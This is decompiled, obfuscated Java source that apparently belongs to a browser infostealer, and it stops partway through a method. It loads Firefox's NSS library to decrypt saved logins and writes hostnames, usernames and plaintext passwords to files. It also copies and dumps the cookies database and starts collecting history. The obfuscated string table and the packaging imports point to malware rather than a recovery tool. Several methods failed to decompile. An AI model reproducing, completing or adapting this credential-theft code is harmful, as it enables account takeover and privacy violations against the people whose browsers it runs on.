/*
 * Decompiled with CFR 0.152.
 */
package a.b.c.g;

import a.b.c.g.g;
import a.b.c.g.n$NSSLibrary;
import a.b.c.g.n$SECItem;
import a.b.c.g.s5;
import a.b.c.j.o;
import com.sun.jna.Memory;
import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.invoke.LambdaMetafactory;
import java.lang.invoke.MethodHandles;
import java.nio.charset.StandardCharsets;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.security.Key;
import java.sql.DriverManager;
import java.util.Base64;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;
import org.json.JSONObject;

public class n {
    public static final n INSTANCE;
    private static final String M;
    private int V = 0;
    private int s = 0;
    private int u = 0;
    private int l = 0;
    private static boolean b;
    private static final String[] h;
    private static final String[] J;
    private static final long[] y;
    private static final Integer[] O;
    private static final long[] x;
    private static final Long[] v;
    private static final long a;

    /*
     * Unable to fully structure code
     */
    public static String decryptFirefoxPassword(String var0) {
        block28: {
            block27: {
                var1_1 = n.a ^ 135491278803169L;
                var4_2 = g.i();
                var3_3 = g.R();
                if (n$NSSLibrary.INSTANCE == null) ** GOTO lbl25
                try {
                    try {
                        v0 = var0;
                        if (var3_3 != null && var4_2 == null) {
                        }
                        break block27;
                    }
                    catch (Exception v1) {
                        throw n.b(v1);
                    }
                    catch (Exception v2) {
                        throw n.J(v2);
                    }
                    if (v0 != null) {
                    }
                    ** GOTO lbl25
                }
                catch (Exception v3) {
                    throw n.J(v3);
                }
                v0 = var0;
            }
            try {
                if (!v0.isEmpty()) break block28;
lbl25:
                // 3 sources

                return null;
            }
            catch (Exception v4) {
                throw n.J(v4);
            }
        }
        try {
            block32: {
                block33: {
                    block31: {
                        block30: {
                            block29: {
                                var5_4 = Base64.getDecoder().decode(var0);
                                var6_6 = new n$SECItem();
                                var6_6.type = 0;
                                var7_7 = new Memory(var5_4.length);
                                var7_7.write(0L, var5_4, 0, var5_4.length);
                                var6_6.data = var7_7;
                                var6_6.len = var5_4.length;
                                var8_8 = new n$SECItem();
                                try {
                                    if (var3_3 == null || n$NSSLibrary.INSTANCE.PK11SDR_Decrypt(var6_6, var8_8, null) == 0) break block29;
                                }
                                catch (Exception v5) {
                                    throw n.b(v5);
                                }
                                return null;
                            }
                            try {
                                v6 = var8_8;
                                v7 = var4_2;
                                if (var3_3 != null) {
                                    if (v7 != null) break block30;
                                }
                                ** GOTO lbl68
                            }
                            catch (Exception v8) {
                                throw n.b(v8);
                            }
                            try {
                                block34: {
                                    if (v6.data == null) break block31;
                                    break block34;
                                    catch (Exception v9) {
                                        throw n.J(v9);
                                    }
                                }
                                v6 = var8_8;
                            }
                            catch (Exception v10) {
                                throw n.J(v10);
                            }
                        }
                        try {
                            v7 = var4_2;
lbl68:
                            // 2 sources

                            try {
                                if (v7 != null) break block32;
                                if (v6.len != 0) break block33;
                            }
                            catch (Exception v11) {
                                throw n.b(v11);
                            }
                        }
                        catch (Exception v12) {
                            throw n.J(v12);
                        }
                    }
                    n$NSSLibrary.INSTANCE.SECITEM_FreeItem(var8_8, 0);
                    return null;
                }
                v6 = var8_8;
            }
            var9_9 = v6.data.getByteArray(0L, var8_8.len);
            var10_10 = new String(var9_9, StandardCharsets.UTF_8);
            n$NSSLibrary.INSTANCE.SECITEM_FreeItem(var8_8, 0);
            return var10_10;
        }
        catch (Exception var5_5) {
            return null;
        }
    }

    private static File u(File file, long l2, String string) {
        File file2;
        block6: {
            File file3;
            block7: {
                File file4;
                l2 = a ^ l2;
                String[] stringArray = g.i();
                try {
                    file4 = string == null ? file : new File(file, string);
                }
                catch (RuntimeException runtimeException) {
                    throw n.J(runtimeException);
                }
                file3 = file4;
                try {
                    try {
                        file2 = file3;
                        if (stringArray != null) break block6;
                        if (file2.exists()) break block7;
                    }
                    catch (RuntimeException runtimeException) {
                        throw n.J(runtimeException);
                    }
                    file3.mkdirs();
                }
                catch (RuntimeException runtimeException) {
                    throw n.J(runtimeException);
                }
            }
            file2 = file3;
        }
        return file2;
    }

    public static File ensureMainOutputDirectory() {
        long l2 = a ^ 0x61C8AB44B994L;
        long l3 = l2 ^ 0x537EBE340696L;
        return n.u(new File(System.getProperty(n.r(-11728, -22571))), l3, n.r(-11729, -4915));
    }

    public static File ensureProfileOutputDirectory(String string) {
        long l2 = a ^ 0x5BE3EC709C55L;
        long l3 = l2 ^ 0x6955F9002357L;
        return n.u(n.ensureMainOutputDirectory(), l3, string);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Unable to fully structure code
     * Could not resolve type clashes
     */
    public static int fetchFirefoxLogins(String var0) {
        block89: {
            block90: {
                block79: {
                    block85: {
                        block78: {
                            block76: {
                                block77: {
                                    block74: {
                                        block75: {
                                            block73: {
                                                block72: {
                                                    var1_1 = n.a ^ 125560233390686L;
                                                    var5_2 = new File(var0, n.r(-11755, -17809));
                                                    var4_3 = g.i();
                                                    var3_4 = g.R();
                                                    try {
                                                        v0 = var5_2.exists();
                                                        if (var4_3 != null) break block72;
                                                        if (v0 != 0) break block73;
                                                    }
                                                    catch (Throwable v1) {
                                                        throw n.J(v1);
                                                    }
                                                    v0 = 0;
                                                }
                                                return v0;
                                            }
                                            try {
                                                v2 = n$NSSLibrary.INSTANCE;
                                                if (var3_4 == null || var4_3 != null) break block74;
                                            }
                                            catch (Throwable v3) {
                                                throw n.b(v3);
                                            }
                                            try {
                                                block96: {
                                                    if (v2 != null) break block75;
                                                    break block96;
                                                    catch (Throwable v4) {
                                                        throw n.J(v4);
                                                    }
                                                }
                                                return 0;
                                            }
                                            catch (Throwable v5) {
                                                throw n.J(v5);
                                            }
                                        }
                                        v2 = n$NSSLibrary.INSTANCE;
                                    }
                                    v6 = v2.NSS_Init(var0);
                                    if (var4_3 != null) break block76;
                                    try {
                                        block97: {
                                            if (v6 == 0) break block77;
                                            break block97;
                                            catch (Throwable v7) {
                                                throw n.J(v7);
                                            }
                                        }
                                        return 0;
                                    }
                                    catch (Throwable v8) {
                                        throw n.J(v8);
                                    }
                                }
                                v6 = 0;
                            }
                            var6_5 = v6;
                            var7_6 = n.ensureProfileOutputDirectory(new File(var0).getName());
                            var8_7 = new File(var7_6, n.r(-11774, -22591));
                            var9_8 = new PrintWriter(new OutputStreamWriter((OutputStream)new FileOutputStream(var8_7), StandardCharsets.UTF_8));
                            var10_10 = null;
                            var11_11 = new String(Files.readAllBytes(var5_2.toPath()), StandardCharsets.UTF_8);
                            var12_14 = new JSONObject(var11_11);
                            var13_15 = var12_14.optJSONArray(n.r(-11730, 28930));
                            try {
                                if (var3_4 != null) {
                                    if (var13_15 == null) break block78;
                                }
                                ** GOTO lbl140
                            }
                            catch (Throwable v9) {
                                throw n.b(v9);
                            }
                            var14_16 = 0;
                            while (var14_16 < var13_15.length()) {
                                block80: {
                                    block81: {
                                        block82: {
                                            block84: {
                                                block83: {
                                                    block100: {
                                                        block99: {
                                                            block98: {
                                                                var15_17 = var13_15.getJSONObject(var14_16);
                                                                var16_18 = var15_17.optString(n.r(-11775, 19928), "");
                                                                var17_19 = var15_17.optString(n.r(-11719, -13044), "");
                                                                var18_20 = var15_17.optString(n.r(-11662, -1436), "");
                                                                var19_21 = n.decryptFirefoxPassword(var17_19);
                                                                var20_22 = n.decryptFirefoxPassword(var18_20);
                                                                try {
                                                                    if (var3_4 == null || var4_3 != null) break block79;
                                                                }
                                                                catch (Throwable v10) {
                                                                    throw n.b(v10);
                                                                }
                                                                try {
                                                                    v11 = var4_3;
                                                                    if (var3_4 == null) break block80;
                                                                    if (v11 == null) {
                                                                    }
                                                                    break block81;
                                                                }
                                                                catch (Throwable v12) {
                                                                    throw n.b(v12);
                                                                }
                                                                catch (Throwable v13) {
                                                                    throw n.J(v13);
                                                                }
                                                                if (var19_21 == null) break block82;
                                                                break block98;
                                                                catch (Throwable v14) {
                                                                    throw n.J(v14);
                                                                }
                                                            }
                                                            if (var20_22 == null) break block82;
                                                            break block99;
                                                            catch (Throwable v15) {
                                                                throw n.J(v15);
                                                            }
                                                        }
                                                        ++var6_5;
                                                        var9_8.println(n.r(-11759, -23538));
                                                        var9_8.println(var16_18);
                                                        v16 = new StringBuilder();
                                                        v17 = var19_21;
                                                        if (var4_3 != null) break block84;
                                                        break block100;
                                                        catch (Throwable v18) {
                                                            throw n.J(v18);
                                                        }
                                                    }
                                                    try {
                                                        block101: {
                                                            if (!v17.isEmpty()) break block83;
                                                            break block101;
                                                            catch (Throwable v19) {
                                                                throw n.J(v19);
                                                            }
                                                        }
                                                        v17 = n.r(-11724, -27918);
                                                        break block84;
                                                    }
                                                    catch (Throwable v20) {
                                                        throw n.J(v20);
                                                    }
                                                }
                                                v17 = var19_21;
                                            }
                                            var9_8.println(v16.append(v17).append(n.r(-11765, -16154)).append(var20_22).toString());
                                            var9_8.println();
                                        }
                                        ++var14_16;
                                    }
                                    v11 = var4_3;
                                }
                                if (v11 == null) continue;
                            }
                        }
                        try {
                            if (var3_4 == null) break block79;
lbl140:
                            // 2 sources

                            try {
                                block102: {
                                    if (var9_8 == null) break block79;
                                    break block102;
                                    catch (Throwable v21) {
                                        throw n.b(v21);
                                    }
                                }
                                if (var10_10 == null) break block85;
                            }
                            catch (Throwable v22) {
                                throw n.b(v22);
                            }
                        }
                        catch (Throwable v23) {
                            throw n.J(v23);
                        }
                        try {
                            var9_8.close();
                        }
                        catch (Throwable var11_12) {
                            var10_10.addSuppressed(var11_12);
                        }
                        break block79;
                    }
                    var9_8.close();
                    break block79;
                    catch (Throwable var11_13) {
                        try {
                            var10_10 = var11_13;
                            throw var11_13;
                        }
                        catch (Throwable var21_23) {
                            block88: {
                                block87: {
                                    try {
                                        if (var9_8 == null) break block87;
                                        if (var10_10 != null) {
                                        }
                                        ** GOTO lbl187
                                    }
                                    catch (Throwable v24) {
                                        throw n.J(v24);
                                    }
                                    try {
                                        var9_8.close();
                                    }
                                    catch (Throwable var22_24) {
                                        try {
                                            try {
                                                v25 = var10_10;
                                                if (var3_4 == null) break block88;
                                                v25.addSuppressed(var22_24);
                                                if (var4_3 == null) break block87;
                                            }
                                            catch (Throwable v26) {
                                                throw n.b(v26);
                                            }
lbl187:
                                            // 2 sources

                                            var9_8.close();
                                        }
                                        catch (Throwable v27) {
                                            throw n.J(v27);
                                        }
                                    }
                                }
                                v25 = var21_23;
                            }
                            throw v25;
                        }
                    }
                }
                try {
                    if (var3_4 == null) break block89;
                    try {
                        block103: {
                            v28 = n$NSSLibrary.INSTANCE;
                            if (var4_3 != null) break block90;
                            break block103;
                            catch (Throwable v29) {
                                throw n.b(v29);
                            }
                        }
                        if (v28 == null) break block89;
                    }
                    catch (Throwable v30) {
                        throw n.b(v30);
                    }
                }
                catch (Throwable v31) {
                    throw n.J(v31);
                }
                v28 = n$NSSLibrary.INSTANCE;
            }
            v28.NSS_Shutdown();
            break block89;
            catch (Exception var9_9) {
                block92: {
                    try {
                        if (var3_4 == null) break block89;
                        try {
                            block104: {
                                v32 = n$NSSLibrary.INSTANCE;
                                if (var4_3 != null) break block92;
                                break block104;
                                catch (Throwable v33) {
                                    throw n.b(v33);
                                }
                            }
                            if (v32 == null) break block89;
                        }
                        catch (Throwable v34) {
                            throw n.b(v34);
                        }
                    }
                    catch (Throwable v35) {
                        throw n.J(v35);
                    }
                    v32 = n$NSSLibrary.INSTANCE;
                }
                v32.NSS_Shutdown();
                catch (Throwable var23_25) {
                    block95: {
                        block94: {
                            try {
                                v36 = n$NSSLibrary.INSTANCE;
                                if (var4_3 != null) break block94;
                                if (v36 == null) break block95;
                            }
                            catch (Throwable v37) {
                                throw n.J(v37);
                            }
                            v36 = n$NSSLibrary.INSTANCE;
                        }
                        v36.NSS_Shutdown();
                    }
                    throw var23_25;
                }
            }
        }
        return var6_5;
    }

    /*
     * Exception decompiling
     */
    public static int fetchFirefoxCookies(String var0) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [3[TRYBLOCK], 14[CATCHBLOCK]], but top level block is 6[TRYBLOCK]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     * Unable to fully structure code
     * Could not resolve type clashes
     */
    private static int h(String var0, long var1_1, int var3_2) {
        block173: {
            block154: {
                block145: {
                    block169: {
                        block170: {
                            block164: {
                                block165: {
                                    block159: {
                                        block160: {
                                            block155: {
                                                block156: {
                                                    block143: {
                                                        block144: {
                                                            var1_1 = n.a ^ var1_1;
                                                            var6_3 = new File(var0, n.r(-11732, 30176));
                                                            var5_4 = g.i();
                                                            var4_5 = g.R();
                                                            v0 = var6_3;
                                                            if (var5_4 != null) break block143;
                                                            try {
                                                                block175: {
                                                                    if (v0.exists()) break block144;
                                                                    break block175;
                                                                    catch (Throwable v1) {
                                                                        throw n.J(v1);
                                                                    }
                                                                }
                                                                return 0;
                                                            }
                                                            catch (Throwable v2) {
                                                                throw n.J(v2);
                                                            }
                                                        }
                                                        v0 = n.ensureProfileOutputDirectory(new File(var0).getName());
                                                    }
                                                    var7_6 = v0;
                                                    var8_7 = new File(var7_6, n.r(-11655, 19275) + var3_2 + "_" + System.nanoTime() + n.r(-11735, 29709));
                                                    var9_8 = 0;
                                                    var10_9 = n.ensureProfileOutputDirectory(new File(var0).getName());
                                                    var11_10 = new File(var10_9, n.r(-11752, -12230));
                                                    Files.copy(var6_3.toPath(), var8_7.toPath(), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
                                                    Class.forName(n.r(-11763, -11284));
                                                    var12_11 = DriverManager.getConnection(n.r(-11743, 5123) + var8_7.getAbsolutePath());
                                                    var13_13 = null;
                                                    var14_14 = var12_11.createStatement();
                                                    var15_17 = null;
                                                    var16_18 = var14_14.executeQuery(n.r(-11738, 27445));
                                                    var17_21 = null;
                                                    var18_22 = new PrintWriter(new OutputStreamWriter((OutputStream)new FileOutputStream(var11_10), StandardCharsets.UTF_8));
                                                    var19_25 = null;
                                                    while (var16_18.next()) {
                                                        block151: {
                                                            block152: {
                                                                block153: {
                                                                    block148: {
                                                                        block149: {
                                                                            block150: {
                                                                                block146: {
                                                                                    block147: {
                                                                                        block176: {
                                                                                            var20_26 = var16_18.getString(n.r(-11713, 24725));
                                                                                            try {
                                                                                                v3 = var16_18.getInt(n.r(-11764, 19466));
                                                                                                v4 = var5_4;
                                                                                                if (var4_5 != null) {
                                                                                                    if (v4 != null) break block145;
                                                                                                }
                                                                                                ** GOTO lbl402
                                                                                            }
                                                                                            catch (Throwable v5) {
                                                                                                throw n.b(v5);
                                                                                            }
                                                                                            if (var5_4 != null) break block146;
                                                                                            break block176;
                                                                                            catch (Throwable v6) {
                                                                                                throw n.J(v6);
                                                                                            }
                                                                                        }
                                                                                        try {
                                                                                            block177: {
                                                                                                if (v3 != 1) break block147;
                                                                                                break block177;
                                                                                                catch (Throwable v7) {
                                                                                                    throw n.J(v7);
                                                                                                }
                                                                                            }
                                                                                            v8 = true;
                                                                                            break block146;
                                                                                        }
                                                                                        catch (Throwable v9) {
                                                                                            throw n.J(v9);
                                                                                        }
                                                                                    }
                                                                                    v8 = false;
                                                                                }
                                                                                var21_29 = v8;
                                                                                var22_30 = var20_26.startsWith(".");
                                                                                try {
                                                                                    v10 = var18_22;
                                                                                    v11 = new StringBuilder().append(var20_26);
                                                                                    if (var1_1 > 0L && var4_5 != null) {
                                                                                        v12 = "\t";
                                                                                        if (var5_4 != null) break block148;
                                                                                    }
                                                                                    ** GOTO lbl88
                                                                                }
                                                                                catch (Throwable v13) {
                                                                                    throw n.b(v13);
                                                                                }
                                                                                try {
                                                                                    v11 = v11.append(v12);
lbl88:
                                                                                    // 2 sources

                                                                                    try {
                                                                                        v14 = var22_30;
                                                                                        if (var4_5 == null) break block149;
                                                                                        if (v14 != 0) {
                                                                                        }
                                                                                        break block150;
                                                                                    }
                                                                                    catch (Throwable v15) {
                                                                                        throw n.b(v15);
                                                                                    }
                                                                                    catch (Throwable v16) {
                                                                                        throw n.J(v16);
                                                                                    }
                                                                                    v12 = n.r(-11769, 24667);
                                                                                    break block148;
                                                                                }
                                                                                catch (Throwable v17) {
                                                                                    throw n.J(v17);
                                                                                }
                                                                            }
                                                                            v14 = -11742;
                                                                        }
                                                                        v12 = n.r(v14, -32641);
                                                                    }
                                                                    try {
                                                                        v18 = v11.append(v12).append("\t").append(var16_18.getString(n.r(-11758, 23410)));
                                                                        if (var1_1 > 0L && var4_5 != null) {
                                                                            v19 = "\t";
                                                                            if (var5_4 != null) break block151;
                                                                        }
                                                                        ** GOTO lbl119
                                                                    }
                                                                    catch (Throwable v20) {
                                                                        throw n.b(v20);
                                                                    }
                                                                    try {
                                                                        v18 = v18.append(v19);
lbl119:
                                                                        // 2 sources

                                                                        try {
                                                                            v21 = var21_29;
                                                                            if (var4_5 == null) break block152;
                                                                            if (v21 != 0) {
                                                                            }
                                                                            break block153;
                                                                        }
                                                                        catch (Throwable v22) {
                                                                            throw n.b(v22);
                                                                        }
                                                                        catch (Throwable v23) {
                                                                            throw n.J(v23);
                                                                        }
                                                                        v19 = n.r(-11652, 15943);
                                                                        break block151;
                                                                    }
                                                                    catch (Throwable v24) {
                                                                        throw n.J(v24);
                                                                    }
                                                                }
                                                                v21 = -11771;
                                                            }
                                                            v19 = n.r(v21, -6443);
                                                        }
                                                        v10.println(v18.append(v19).append("\t").append(var16_18.getLong(n.r(-11746, 21252))).append("\t").append(var16_18.getString(n.r(-11654, -29047))).append("\t").append(var16_18.getString(n.r(-11721, 14481))).toString());
                                                        ++var9_8;
                                                        if (var5_4 == null) continue;
                                                    }
                                                    try {
                                                        block178: {
                                                            if (var1_1 <= 0L) break block154;
                                                            v25 = var4_5;
                                                            if (var1_1 <= 0L) ** GOTO lbl149
                                                            if (v25 == null) break block154;
                                                            v25 = var4_5;
lbl149:
                                                            // 2 sources

                                                            if (v25 == null) break block155;
                                                            break block178;
                                                            catch (Throwable v26) {
                                                                throw n.b(v26);
                                                            }
                                                        }
                                                        try {
                                                            block179: {
                                                                if (var18_22 == null) break block155;
                                                                break block179;
                                                                catch (Throwable v27) {
                                                                    throw n.b(v27);
                                                                }
                                                            }
                                                            if (var19_25 != null) {
                                                                break block156;
                                                            }
                                                            ** GOTO lbl183
                                                        }
                                                        catch (Throwable v28) {
                                                            throw n.b(v28);
                                                        }
                                                    }
                                                    catch (Throwable v29) {
                                                        throw n.J(v29);
                                                    }
                                                }
                                                try {
                                                    var18_22.close();
                                                    break block155;
                                                }
                                                catch (Throwable var20_27) {
                                                    try {
                                                        var19_25.addSuppressed(var20_27);
                                                        v30 = var4_5;
                                                        if (var1_1 < 0L) ** GOTO lbl228
                                                        if (v30 == null) break block155;
                                                        try {
                                                            block180: {
                                                                if (var5_4 == null) break block155;
                                                                break block180;
                                                                catch (Throwable v31) {
                                                                    throw n.b(v31);
                                                                }
                                                            }
                                                            var18_22.close();
                                                            break block155;
                                                        }
                                                        catch (Throwable v32) {
                                                            throw n.b(v32);
                                                        }
                                                    }
                                                    catch (Throwable v33) {
                                                        throw n.J(v33);
                                                    }
                                                }
                                                catch (Throwable var20_28) {
                                                    try {
                                                        var19_25 = var20_28;
                                                        throw var20_28;
                                                    }
                                                    catch (Throwable var23_31) {
                                                        block158: {
                                                            block157: {
                                                                try {
                                                                    if (var18_22 == null) break block157;
                                                                    if (var19_25 != null) {
                                                                    }
                                                                    ** GOTO lbl216
                                                                }
                                                                catch (Throwable v34) {
                                                                    throw n.J(v34);
                                                                }
                                                                try {
                                                                    var18_22.close();
                                                                }
                                                                catch (Throwable var24_32) {
                                                                    try {
                                                                        try {
                                                                            if (var1_1 > 0L) {
                                                                                v35 = var19_25;
                                                                                if (var4_5 == null) break block158;
                                                                                v35.addSuppressed(var24_32);
                                                                            }
                                                                            if (var5_4 == null) break block157;
                                                                        }
                                                                        catch (Throwable v36) {
                                                                            throw n.b(v36);
                                                                        }
lbl216:
                                                                        // 2 sources

                                                                        var18_22.close();
                                                                    }
                                                                    catch (Throwable v37) {
                                                                        throw n.J(v37);
                                                                    }
                                                                }
                                                            }
                                                            v35 = var23_31;
                                                        }
                                                        throw v35;
                                                    }
                                                }
                                            }
                                            try {
                                                v30 = var4_5;
lbl228:
                                                // 2 sources

                                                if (var1_1 <= 0L) ** GOTO lbl290
                                                if (v30 == null) break block159;
                                                try {
                                                    block181: {
                                                        if (var16_18 == null) break block159;
                                                        break block181;
                                                        catch (Throwable v38) {
                                                            throw n.b(v38);
                                                        }
                                                    }
                                                    if (var17_21 == null) break block160;
                                                }
                                                catch (Throwable v39) {
                                                    throw n.b(v39);
                                                }
                                            }
                                            catch (Throwable v40) {
                                                throw n.J(v40);
                                            }
                                            try {
                                                var16_18.close();
                                            }
                                            catch (Throwable var18_23) {
                                                var17_21.addSuppressed(var18_23);
                                            }
                                            break block159;
                                        }
                                        var16_18.close();
                                        break block159;
                                        catch (Throwable var18_24) {
                                            try {
                                                var17_21 = var18_24;
                                                throw var18_24;
                                            }
                                            catch (Throwable var25_33) {
                                                block163: {
                                                    block162: {
                                                        try {
                                                            if (var16_18 == null) break block162;
                                                            if (var17_21 != null) {
                                                            }
                                                            ** GOTO lbl278
                                                        }
                                                        catch (Throwable v41) {
                                                            throw n.J(v41);
                                                        }
                                                        try {
                                                            var16_18.close();
                                                        }
                                                        catch (Throwable var26_34) {
                                                            try {
                                                                try {
                                                                    if (var1_1 > 0L) {
                                                                        v42 = var17_21;
                                                                        if (var4_5 == null) break block163;
                                                                        v42.addSuppressed(var26_34);
                                                                    }
                                                                    if (var5_4 == null) break block162;
                                                                }
                                                                catch (Throwable v43) {
                                                                    throw n.b(v43);
                                                                }
lbl278:
                                                                // 2 sources

                                                                var16_18.close();
                                                            }
                                                            catch (Throwable v44) {
                                                                throw n.J(v44);
                                                            }
                                                        }
                                                    }
                                                    v42 = var25_33;
                                                }
                                                throw v42;
                                            }
                                        }
                                    }
                                    try {
                                        v30 = var4_5;
lbl290:
                                        // 2 sources

                                        if (v30 == null) break block164;
                                        try {
                                            block182: {
                                                if (var14_14 == null) break block164;
                                                break block182;
                                                catch (Throwable v45) {
                                                    throw n.b(v45);
                                                }
                                            }
                                            if (var15_17 == null) break block165;
                                        }
                                        catch (Throwable v46) {
                                            throw n.b(v46);
                                        }
                                    }
                                    catch (Throwable v47) {
                                        throw n.J(v47);
                                    }
                                    try {
                                        var14_14.close();
                                    }
                                    catch (Throwable var16_19) {
                                        var15_17.addSuppressed(var16_19);
                                    }
                                    break block164;
                                }
                                var14_14.close();
                                break block164;
                                catch (Throwable var16_20) {
                                    try {
                                        var15_17 = var16_20;
                                        throw var16_20;
                                    }
                                    catch (Throwable var27_35) {
                                        block168: {
                                            block167: {
                                                try {
                                                    if (var14_14 == null) break block167;
                                                    if (var15_17 != null) {
                                                    }
                                                    ** GOTO lbl339
                                                }
                                                catch (Throwable v48) {
                                                    throw n.J(v48);
                                                }
                                                try {
                                                    var14_14.close();
                                                }
                                                catch (Throwable var28_36) {
                                                    try {
                                                        try {
                                                            if (var1_1 >= 0L) {
                                                                v49 = var15_17;
                                                                if (var4_5 == null) break block168;
                                                                v49.addSuppressed(var28_36);
                                                            }
                                                            if (var5_4 == null) break block167;
                                                        }
                                                        catch (Throwable v50) {
                                                            throw n.b(v50);
                                                        }
lbl339:
                                                        // 2 sources

                                                        var14_14.close();
                                                    }
                                                    catch (Throwable v51) {
                                                        throw n.J(v51);
                                                    }
                                                }
                                            }
                                            v49 = var27_35;
                                        }
                                        throw v49;
                                    }
                                }
                            }
                            try {
                                if (var12_11 == null) break block169;
                                if (var13_13 == null) break block170;
                            }
                            catch (Throwable v52) {
                                throw n.J(v52);
                            }
                            try {
                                var12_11.close();
                            }
                            catch (Throwable var14_15) {
                                var13_13.addSuppressed(var14_15);
                            }
                            break block169;
                        }
                        var12_11.close();
                        break block169;
                        catch (Throwable var14_16) {
                            try {
                                var13_13 = var14_16;
                                throw var14_16;
                            }
                            catch (Throwable var29_37) {
                                block172: {
                                    block171: {
                                        try {
                                            if (var12_11 == null) break block171;
                                            if (var13_13 != null) {
                                            }
                                            ** GOTO lbl389
                                        }
                                        catch (Throwable v53) {
                                            throw n.J(v53);
                                        }
                                        try {
                                            var12_11.close();
                                        }
                                        catch (Throwable var30_38) {
                                            try {
                                                try {
                                                    if (var1_1 > 0L) {
                                                        v54 = var13_13;
                                                        if (var4_5 == null) break block172;
                                                        v54.addSuppressed(var30_38);
                                                    }
                                                    if (var5_4 == null) break block171;
                                                }
                                                catch (Throwable v55) {
                                                    throw n.b(v55);
                                                }
lbl389:
                                                // 2 sources

                                                var12_11.close();
                                            }
                                            catch (Throwable v56) {
                                                throw n.J(v56);
                                            }
                                        }
                                    }
                                    v54 = var29_37;
                                }
                                throw v54;
                            }
                        }
                    }
                    v3 = (int)var8_7.exists();
                }
                v4 = var5_4;
lbl402:
                // 2 sources

                if (v4 != null) break block173;
                try {
                    block183: {
                        if (v3 == 0) break block154;
                        break block183;
                        catch (Throwable v57) {
                            throw n.J(v57);
                        }
                    }
                    var8_7.delete();
                    break block154;
                }
                catch (Throwable v58) {
                    throw n.J(v58);
                }
                catch (Exception var12_12) {
                    v3 = var8_7.exists();
                    if (var5_4 != null) break block173;
                    try {
                        block184: {
                            if (v3 == 0) break block154;
                            break block184;
                            catch (Throwable v59) {
                                throw n.J(v59);
                            }
                        }
                        var8_7.delete();
                    }
                    catch (Throwable v60) {
                        throw n.J(v60);
                    }
                    catch (Throwable var31_39) {
                        block174: {
                            try {
                                try {
                                    v61 = var8_7.exists();
                                    if (var5_4 != null || !v61) break block174;
                                }
                                catch (Throwable v62) {
                                    throw n.J(v62);
                                }
                                v61 = var8_7.delete();
                            }
                            catch (Throwable v63) {
                                throw n.J(v63);
                            }
                        }
                        throw var31_39;
                    }
                }
            }
            v3 = var9_8;
        }
        return v3;
    }

    /*
     * Exception decompiling
     */
    private static int b(String var0, int var1_1, int var2_2, String var3_3, String var4_4, byte var5_5, String var6_6, String var7_7) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [64[CASE]], but top level block is 14[TRYBLOCK]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    public static int fetchFirefoxHistory(String string) {
        long l2 = a ^ 0x31B42ECC41FL;
        long l3 = l2 ^ 0x207146119596L;
        int n2 = (int)(l3 >>> 32);
        int n3 = (int)(l3 << 32 >>> 40);
        int n4 = (int)(l3 << 56 >>> 56);
